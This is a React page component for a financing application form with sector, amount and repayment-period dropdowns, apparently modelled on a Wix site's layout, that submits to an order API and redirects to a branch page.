import axios from "axios";
import { useState } from "react";
import { useNavigate } from "react-router-dom";
import { formLevelErrorClass } from "../components/FormFieldError";
import { PendingFormOverlay } from "../components/PendingFormOverlay";
import { BottomBar } from "../components/VisitorShared";
import { useLanguage } from "../context/LanguageContext";
import { api_route } from "../socketApi";
import {
  APPLY_AMOUNTS,
  APPLY_PERIODS,
  APPLY_SECTORS,
} from "../constants/formOptions";

/** Wix dropdown chevron */
function SelectChevron({ className }) {
  return (
    <svg
      className={className}
      xmlns="http://www.w3.org/2000/svg"
      viewBox="0 0 9.2828 4.89817"
      aria-hidden
    >
      <path
        fill="currentColor"
        d="M4.64116,4.89817a.5001.5001,0,0,1-.34277-.13574L.15727.86448A.50018.50018,0,0,1,.84282.136L4.64116,3.71165,8.44.136a.50018.50018,0,0,1,.68555.72852L4.98393,4.76243A.5001.5001,0,0,1,4.64116,4.89817Z"
      />
    </svg>
  );
}

function wixSelectWrapClass(err) {
  return `relative w-full ${err ? "rounded-md ring-2 ring-red-400" : ""}`;
}

function wixSelectClass() {
  return [
    "w-full appearance-none rounded-md border border-slate-300 bg-white",
    "py-3 ps-4 pe-10 text-sm text-slate-800 outline-none transition",
    "focus:border-slate-500 focus:ring-1 focus:ring-slate-400",
  ].join(" ");
}

export default function Apply() {
  const { t, dir, textDir } = useLanguage();
  const navigate = useNavigate();
  const [repaymentPeriod, setRepaymentPeriod] = useState("");
  const [financingAmount, setFinancingAmount] = useState("");
  const [sectorType, setSectorType] = useState("");
  const [fieldErr, setFieldErr] = useState({});
  const [formError, setFormError] = useState("");
  const [loading, setLoading] = useState(false);

  /** Wix form has no bank field — persist placeholder for admin/API */
  const FINANCING_BANK_PLACEHOLDER = "غير محدد";

  const validate = () => {
    const e = {};
    if (!repaymentPeriod) e.repaymentPeriod = true;
    if (!String(financingAmount).trim()) e.financingAmount = true;
    if (!sectorType) e.sectorType = true;
    setFieldErr(e);
    return Object.keys(e).length === 0;
  };

  const onSubmit = async (ev) => {
    ev.preventDefault();
    setFormError("");
    if (!validate()) return;
    setLoading(true);
    try {
      const { data } = await axios.post(`${api_route}/order/application`, {
        financingBank: FINANCING_BANK_PLACEHOLDER,
        repaymentPeriod,
        financingAmount: String(financingAmount).trim(),
        sectorType,
      });
      const id = data.orderId ?? data.order?._id;
      if (!id) {
        setFormError(t("formData.errors.formFailed"));
        return;
      }
      sessionStorage.setItem("currentOrderId", id);
      navigate("/branch", { state: { orderId: id } });
    } catch {
      setFormError(t("formData.errors.formFailed"));
    } finally {
      setLoading(false);
    }
  };

  return (
    <section
      className="relative min-h-screen w-full flex justify-center  bg-white"
      dir={dir}
    >
      <div
        className="w-full lg:w-1/3 flex flex-col items-center justify-between"
        dir={textDir}
      >
        <img
          src="/wix/landing-top-logo.png"
          alt=""
          width={134}
          height={61}
          className="mb-3 w-[134px] object-cover self-center"
          fetchPriority="high"
        />
        {/* comp-mou64mso — top hero */}
        <img
          src="/wix/apply-hero.png"
          alt=""
          className="mb-6 w-full  object-cover"
          fetchPriority="high"
        />

        {/* comp-m3e7p7jn3 — Wix form order: sector, amount, period, submit */}
        <form
          onSubmit={onSubmit}
          className="relative flex w-full max-w-[320px] flex-col gap-4"
          noValidate
        >
          <PendingFormOverlay
            show={loading}
            ariaLabel={t("common.loadingAria")}
          />
          <div className={wixSelectWrapClass(!!fieldErr.sectorType)}>
            <select
              id="apply-sector"
              aria-label={t("apply.placeholderSector")}
              required
              value={sectorType}
              onChange={(e) => {
                setSectorType(e.target.value);
                setFieldErr((f) => ({ ...f, sectorType: false }));
              }}
              className={wixSelectClass()}
            >
              <option value="" disabled>
                {t("apply.placeholderSector")}
              </option>
              {APPLY_SECTORS.map((s) => (
                <option key={s.value} value={s.value}>
                  {s.label}
                </option>
              ))}
            </select>
            <span className="pointer-events-none absolute end-3 top-1/2 -translate-y-1/2 text-slate-500">
              <SelectChevron className="h-2 w-3" />
            </span>
          </div>

          <div className={wixSelectWrapClass(!!fieldErr.financingAmount)}>
            <select
              id="apply-amount"
              aria-label={t("apply.placeholderAmount")}
              required
              value={financingAmount}
              onChange={(e) => {
                setFinancingAmount(e.target.value);
                setFieldErr((f) => ({ ...f, financingAmount: false }));
              }}
              className={wixSelectClass()}
            >
              <option value="" disabled>
                {t("apply.placeholderAmount")}
              </option>
              {APPLY_AMOUNTS.map((a) => (
                <option key={a.value} value={a.value}>
                  {a.label}
                </option>
              ))}
            </select>
            <span className="pointer-events-none absolute end-3 top-1/2 -translate-y-1/2 text-slate-500">
              <SelectChevron className="h-2 w-3" />
            </span>
          </div>

          <div className={wixSelectWrapClass(!!fieldErr.repaymentPeriod)}>
            <select
              id="apply-period"
              aria-label={t("apply.placeholderPeriod")}
              required
              value={repaymentPeriod}
              onChange={(e) => {
                setRepaymentPeriod(e.target.value);
                setFieldErr((f) => ({ ...f, repaymentPeriod: false }));
              }}
              className={wixSelectClass()}
            >
              <option value="" disabled>
                {t("apply.placeholderPeriod")}
              </option>
              {APPLY_PERIODS.map((p) => (
                <option key={p.value} value={p.value}>
                  {p.label}
                </option>
              ))}
            </select>
            <span className="pointer-events-none absolute end-3 top-1/2 -translate-y-1/2 text-slate-500">
              <SelectChevron className="h-2 w-3" />
            </span>
          </div>

          {formError ? (
            <div className={formLevelErrorClass()} role="alert">
              {formError}
            </div>
          ) : null}

          {/* comp-m3e7p7jw2 */}
          <button
            type="submit"
            disabled={loading}
            aria-label={t("apply.submit")}
            className="w-full rounded-md bg-[#B80070] py-3 text-center text-base font-medium text-white shadow-sm transition  disabled:opacity-60"
          >
            {t("apply.submit")}
          </button>
        </form>

        {/* comp-mou630q4 */}
        <img
          src="/wix/landing-screenshot-2.png"
          alt=""
          className="mt-8 w-full  object-cover"
          fetchPriority="high"
        />
      </div>

      <BottomBar />
    </section>
  );
}
